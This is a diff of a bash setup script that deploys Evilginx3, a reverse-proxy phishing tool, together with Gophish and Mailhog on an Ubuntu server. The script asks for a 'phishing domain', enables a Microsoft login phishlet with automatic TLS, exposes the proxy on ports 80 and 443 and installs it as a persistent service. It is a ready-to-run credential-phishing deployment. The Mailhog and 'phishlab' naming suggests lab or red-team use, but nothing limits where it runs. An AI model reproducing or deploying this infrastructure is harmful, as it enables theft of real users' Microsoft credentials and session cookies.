@@ -1,78 +1,173 @@
 #!/bin/bash
-# ==== Evilginx3 (v3.3.0) + Gophish + Mailhog Setup Script (Ubuntu 20.04, Vultr) ====
+# ==== Evilginx3 (v3.3.0) + Gophish + Mailhog Setup Script (Ubuntu 20.04) ====
 
-set -e
+set -euo pipefail
+
+cleanup() {
+  echo ""
+  echo "Installation interrupted or failed. Partial install may exist."
+  echo "Re-run this script to continue or fix issues manually."
+}
+trap cleanup ERR
+
+# ==== Input: Domain ====
+if [ -n "${1:-}" ]; then
+  DOMAIN="$1"
+else
+  read -rp "Enter your phishing domain (e.g. login.yourdomain.com): " DOMAIN
+fi
+
+if [ -z "$DOMAIN" ]; then
+  echo "Error: Domain cannot be empty."
+  exit 1
+fi
 
 # ==== Variables ====
-DOMAIN="login.cyb3rdefence.com"
-STATIC_DOMAIN="static.cyb3rdefence.com"
 EMAIL="admin@$DOMAIN"
 GOPHISH_PORT=8800
-MAILHOG_PORT=8025
-GOPHISH_USER="admin"
-GOPHISH_PASS="$(openssl rand -hex 12)"
+MAILHOG_UI_PORT=8025
+MAILHOG_SMTP_PORT=1025
+GOPHISH_VERSION="0.12.1"
+GO_VERSION="1.22.3"
 EVILGINX_DIR="/opt/evilginx2"
 PHISHLETS_PATH="$EVILGINX_DIR/phishlets"
+SERVICE_USER="phishlab"
+
+# Resolve public IP once
+echo "Resolving public IP..."
+PUBLIC_IP="$(curl -sf ifconfig.me || curl -sf icanhazip.com || true)"
+if [ -z "$PUBLIC_IP" ]; then
+  echo "Error: Could not determine public IP address."
+  exit 1
+fi
+echo "Public IP: $PUBLIC_IP"
+
+# ==== Idempotency: skip steps if already done ====
+is_installed() { command -v "$1" &>/dev/null; }
 
 # ==== Update & Install Base Packages ====
+echo "Installing base packages..."
 apt update && apt upgrade -y
-apt install -y git make curl unzip ufw build-essential ca-certificates gnupg lsb-release libcap2-bin net-tools
+apt install -y git make curl unzip ufw build-essential ca-certificates \
+  gnupg lsb-release libcap2-bin net-tools jq wget
 
-# ==== Install Go 1.22.3 ====
-GO_VERSION="1.22.3"
-cd /tmp
-curl -LO https://go.dev/dl/go$GO_VERSION.linux-amd64.tar.gz
-rm -rf /usr/local/go && tar -C /usr/local -xzf go$GO_VERSION.linux-amd64.tar.gz
+# ==== Create Service User ====
+if ! id "$SERVICE_USER" &>/dev/null; then
+  useradd -r -s /usr/sbin/nologin -d /opt "$SERVICE_USER"
+fi
 
-# Add Go to PATH permanently and for current session
+# ==== Install Go ====
+if ! is_installed go || [[ "$(go version 2>/dev/null)" != *"$GO_VERSION"* ]]; then
+  echo "Installing Go $GO_VERSION..."
+  cd /tmp
+  curl -LO "https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz"
+  rm -rf /usr/local/go && tar -C /usr/local -xzf "go${GO_VERSION}.linux-amd64.tar.gz"
+  rm -f "go${GO_VERSION}.linux-amd64.tar.gz"
+else
+  echo "Go $GO_VERSION already installed, skipping."
+fi
+
+export PATH=$PATH:/usr/local/go/bin
 echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
 chmod +x /etc/profile.d/go.sh
-export PATH=$PATH:/usr/local/go/bin
+grep -qxF 'export PATH=$PATH:/usr/local/go/bin' /root/.bashrc 2>/dev/null \
+  || echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.bashrc
 
-# ==== Install Evilginx3 (v3.3.0 from kgretzky repo) ====
-cd /opt
-rm -rf $EVILGINX_DIR
-git clone --branch v3.3.0 https://github.com/kgretzky/evilginx2.git $EVILGINX_DIR
-cd $EVILGINX_DIR
-mkdir -p dist
+# ==== Install Evilginx3 (v3.3.0) ====
+if [ ! -f "$EVILGINX_DIR/dist/evilginx" ]; then
+  echo "Building Evilginx3 v3.3.0..."
+  cd /opt
+  rm -rf "$EVILGINX_DIR"
+  git clone --branch v3.3.0 https://github.com/kgretzky/evilginx2.git "$EVILGINX_DIR"
+  cd "$EVILGINX_DIR"
+  mkdir -p dist
+  go build -o dist/evilginx main.go
+  setcap cap_net_bind_service=+ep dist/evilginx
+  chown -R "$SERVICE_USER":"$SERVICE_USER" "$EVILGINX_DIR"
+else
+  echo "Evilginx3 binary already exists, skipping build."
+fi
 
-go build -o dist/evilginx main.go
-setcap cap_net_bind_service=+ep dist/evilginx
+# ==== Evilginx Config Commands Reference ====
+cat <<EOF > /root/evilginx_setup_commands.txt
+# Run these commands inside the Evilginx interactive prompt:
+#   $EVILGINX_DIR/dist/evilginx -p $PHISHLETS_PATH
+#
+# Then paste each line below:
 
-# ==== Evilginx Auto Config File ====
-cat <<EOF > /root/evilginx2_autosetup.txt
 config domain $DOMAIN
-config ip $(curl -s ifconfig.me)
+config ip $PUBLIC_IP
 config redirect_url https://login.microsoftonline.com/
 config autocert on
 phishlets hostname microsoft $DOMAIN
 phishlets enable microsoft
 EOF
 
-# ==== Install Gophish ====
-cd /opt
-curl -LO https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
-unzip gophish-v0.12.1-linux-64bit.zip -d gophish
-cd gophish
-sed -i "s/\"admin_server\":.*/\"admin_server\": \"0.0.0.0:$GOPHISH_PORT\",/" config.json
-sed -i "s/\"use_tls\": true/\"use_tls\": false/" config.json
+echo "Evilginx setup commands saved to /root/evilginx_setup_commands.txt"
 
-# ==== Store Gophish Credentials ====
-echo -e "Gophish Login:\nUser: $GOPHISH_USER\nPass: $GOPHISH_PASS" > /root/gophish-credentials.txt
+# ==== Install Gophish ====
+GOPHISH_DIR="/opt/gophish"
+GOPHISH_URL="https://github.com/gophish/gophish/releases/download/v${GOPHISH_VERSION}/gophish-v${GOPHISH_VERSION}-linux-64bit.zip"
+
+if [ ! -f "$GOPHISH_DIR/gophish" ]; then
+  echo "Installing Gophish v${GOPHISH_VERSION}..."
+  cd /opt
+  curl -LO "$GOPHISH_URL"
+  unzip -o "gophish-v${GOPHISH_VERSION}-linux-64bit.zip" -d gophish
+  rm -f "gophish-v${GOPHISH_VERSION}-linux-64bit.zip"
+  chmod +x "$GOPHISH_DIR/gophish"
+else
+  echo "Gophish already installed, skipping."
+fi
+
+# Configure Gophish: bind admin to localhost (use SSH tunnel for access), disable TLS
+cd "$GOPHISH_DIR"
+jq --arg port "127.0.0.1:$GOPHISH_PORT" \
+   '.admin_server.listen_url = $port | .admin_server.use_tls = false' \
+   config.json > config.json.tmp && mv config.json.tmp config.json
+
+chown -R "$SERVICE_USER":"$SERVICE_USER" "$GOPHISH_DIR"
 
 # ==== Install Mailhog ====
-wget -O /usr/local/bin/mailhog https://github.com/mailhog/MailHog/releases/download/v1.0.1/MailHog_linux_amd64
-chmod +x /usr/local/bin/mailhog
+if [ ! -f /usr/local/bin/mailhog ]; then
+  echo "Installing Mailhog..."
+  wget -O /usr/local/bin/mailhog \
+    https://github.com/mailhog/MailHog/releases/download/v1.0.1/MailHog_linux_amd64
+  chmod +x /usr/local/bin/mailhog
+else
+  echo "Mailhog already installed, skipping."
+fi
 
 # ==== Setup UFW Firewall ====
-ufw allow 22
-ufw allow 80
-ufw allow 443
-ufw allow $GOPHISH_PORT
-ufw allow $MAILHOG_PORT
+echo "Configuring firewall..."
+ufw allow 22/tcp
+ufw allow 80/tcp
+ufw allow 443/tcp
+ufw allow "$GOPHISH_PORT"/tcp
+ufw allow "$MAILHOG_UI_PORT"/tcp
 ufw --force enable
 
-# ==== Start Services ====
+# ==== Systemd Services ====
+
+# Evilginx3 service
+cat <<EOF > /etc/systemd/system/evilginx.service
+[Unit]
+Description=Evilginx3 Phishing Proxy
+After=network.target
+
+[Service]
+Type=simple
+User=$SERVICE_USER
+WorkingDirectory=$EVILGINX_DIR
+ExecStart=$EVILGINX_DIR/dist/evilginx -p $PHISHLETS_PATH
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Gophish service
 cat <<EOF > /etc/systemd/system/gophish.service
 [Unit]
 Description=Gophish Phishing Server
@@ -80,66 +175,84 @@ After=network.target
 
 [Service]
 Type=simple
-User=root
-WorkingDirectory=/opt/gophish
-ExecStart=/opt/gophish/gophish
+User=$SERVICE_USER
+WorkingDirectory=$GOPHISH_DIR
+ExecStart=$GOPHISH_DIR/gophish
 Restart=always
+RestartSec=5
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
+# Mailhog service
 cat <<EOF > /etc/systemd/system/mailhog.service
 [Unit]
-Description=Mailhog Service
+Description=Mailhog SMTP Testing Server
 After=network.target
 
 [Service]
-ExecStart=/usr/local/bin/mailhog -api-bind-addr=0.0.0.0:$MAILHOG_PORT -ui-bind-addr=0.0.0.0:$MAILHOG_PORT
+ExecStart=/usr/local/bin/mailhog \
+  -smtp-bind-addr=127.0.0.1:$MAILHOG_SMTP_PORT \
+  -api-bind-addr=0.0.0.0:$MAILHOG_UI_PORT \
+  -ui-bind-addr=0.0.0.0:$MAILHOG_UI_PORT
 Restart=always
+RestartSec=5
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-systemctl daemon-reexec
 systemctl daemon-reload
-systemctl enable --now gophish mailhog
+systemctl enable --now evilginx gophish mailhog
 
-# ==== Post-Install: Service Verification ====
-echo "\nVerifying service availability..."
+# ==== Post-Install Verification ====
+printf "\nVerifying service availability...\n"
 
-# Check Evilginx3 binary
-if [ -f "$EVILGINX_DIR/dist/evilginx" ]; then
-  echo "✔ Evilginx binary exists: $EVILGINX_DIR/dist/evilginx"
-else
-  echo "✖ Evilginx binary not found. Check build logs."
-fi
+for svc in evilginx gophish mailhog; do
+  if systemctl is-active --quiet "$svc"; then
+    echo "[OK] $svc is running"
+  else
+    echo "[FAIL] $svc failed to start — check: journalctl -u $svc"
+  fi
+done
 
-# Check Gophish service
-if systemctl is-active --quiet gophish; then
-  echo "✔ Gophish service is running"
-else
-  echo "✖ Gophish service failed to start"
-fi
+printf "\nActive listeners:\n"
+netstat -tuln | grep -E ":(80|443|$GOPHISH_PORT|$MAILHOG_UI_PORT|$MAILHOG_SMTP_PORT)" || true
 
-# Check Mailhog service
-if systemctl is-active --quiet mailhog; then
-  echo "✔ Mailhog service is running"
-else
-  echo "✖ Mailhog service failed to start"
-fi
-
-# Port checks
-echo "\nActive listeners:"
-netstat -tuln | grep -E ":(80|443|$GOPHISH_PORT|$MAILHOG_PORT)"
+# ==== Capture Gophish Initial Password ====
+printf "\nWaiting for Gophish to generate initial password...\n"
+sleep 3
+GOPHISH_INITIAL_PASS=$(journalctl -u gophish --no-pager -n 50 | grep -oP 'Please login with the username admin and the password \K\S+' || true)
 
 # ==== Completion Output ====
-echo "\nSetup Complete!"
-echo "Evilginx path: $EVILGINX_DIR/dist/evilginx"
-echo "Run it with phishlets: $EVILGINX_DIR/dist/evilginx -p $PHISHLETS_PATH"
-echo "Auto-setup commands stored in: /root/evilginx2_autosetup.txt"
-echo "Gophish UI: http://$(curl -s ifconfig.me):$GOPHISH_PORT"
-echo "Mailhog UI: http://$(curl -s ifconfig.me):$MAILHOG_PORT"
-echo "Gophish credentials saved in /root/gophish-credentials.txt"
-echo "To apply Evilginx config: type 'source /root/evilginx2_autosetup.txt' inside Evilginx prompt."
+printf "\n========================================\n"
+printf "  Setup Complete\n"
+printf "========================================\n\n"
+
+echo "Domain:       $DOMAIN"
+echo "Public IP:    $PUBLIC_IP"
+echo ""
+echo "Evilginx3:    running as systemd service 'evilginx'"
+echo "  Binary:     $EVILGINX_DIR/dist/evilginx"
+echo "  Setup:      Paste commands from /root/evilginx_setup_commands.txt into evilginx prompt"
+echo "  Note:       Stop the service first, then run interactively to configure:"
+echo "              systemctl stop evilginx"
+echo "              $EVILGINX_DIR/dist/evilginx -p $PHISHLETS_PATH"
+echo ""
+echo "Gophish:      http://127.0.0.1:$GOPHISH_PORT (access via SSH tunnel)"
+echo "  SSH tunnel: ssh -L $GOPHISH_PORT:127.0.0.1:$GOPHISH_PORT root@$PUBLIC_IP"
+echo "  Username:   admin"
+if [ -n "$GOPHISH_INITIAL_PASS" ]; then
+  echo "  Password:   $GOPHISH_INITIAL_PASS (initial — you will be prompted to change it)"
+else
+  echo "  Password:   Check with: journalctl -u gophish | grep password"
+fi
+echo ""
+echo "Mailhog:      http://$PUBLIC_IP:$MAILHOG_UI_PORT"
+echo "  SMTP:       localhost:$MAILHOG_SMTP_PORT (configure as Gophish sending profile)"
+echo ""
+echo "To configure Gophish -> Mailhog integration:"
+echo "  1. Open Gophish admin UI"
+echo "  2. Go to Sending Profiles"
+echo "  3. Set SMTP host to: localhost:$MAILHOG_SMTP_PORT"
